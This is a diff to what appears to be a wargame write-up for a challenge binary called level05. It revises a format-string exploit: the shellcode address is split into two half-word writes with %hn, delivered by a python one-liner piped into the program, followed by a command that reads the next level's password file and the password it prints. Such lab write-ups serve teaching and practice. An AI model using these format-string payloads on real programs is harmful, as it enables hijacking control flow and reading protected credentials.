@@ -33,13 +33,19 @@ int main(int argc, char **argv)
 compile with flag -m32 to get the 32 bit addr
 
 
-* shellcode addr : `0x  7fffffffe107` => decimal 
-						  2 147 483 647       57607
+* shellcode addr : `0xffffd80f` => decimal => 4294957071 (it's big, let's put it in two part)
+					65535  55311
 * addr of exit   : `0xf7e5eb70`
 
+We want to put short value like this:
 
-`addr exit` + `%c` + `%10$n`
+`\x08\x04\x97\xe0` + 2 <= `ffff` <= 65535
+`\x08\x04\x97\xe0`     <= `d80f` <= 55311
 
-`python -c "print '\x38\x98\x04\x08' + '%2048x%4\$hn' + '%31904x%4\$hn'" > /tmp/exploit_5; cat /tmp/exploit_5 - | ./level5`
 
-python -c "print '\x08\x04\x97\xe0'[::-1] + '%57603c' + '%11\$c' + '%2147426040c' + '%10\$n'"> /tmp/exploit_5; cat /tmp/exploit_5 | ./level05
+python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55303c' + '%10\$hn' + '%10224c' + '%11\$hn'"> /tmp/exploit_5; cat /tmp/exploit_5 - | ./level05
+
+```
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+```
